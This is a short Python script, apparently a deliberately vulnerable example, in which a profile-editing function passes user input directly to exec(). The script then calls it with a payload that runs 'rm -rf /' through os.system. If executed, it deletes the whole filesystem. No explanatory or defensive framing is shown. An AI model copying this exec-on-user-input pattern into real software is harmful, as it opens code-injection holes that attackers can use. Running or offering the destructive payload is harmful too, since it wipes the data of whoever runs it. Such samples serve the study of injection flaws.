def execute_user_script(user_input):
    exec(user_input)

def edit_user_profile(user_id, script):
    execute_user_script(script)

user_input = "__import__('os').system('rm -rf /')"
edit_user_profile('user123', user_input)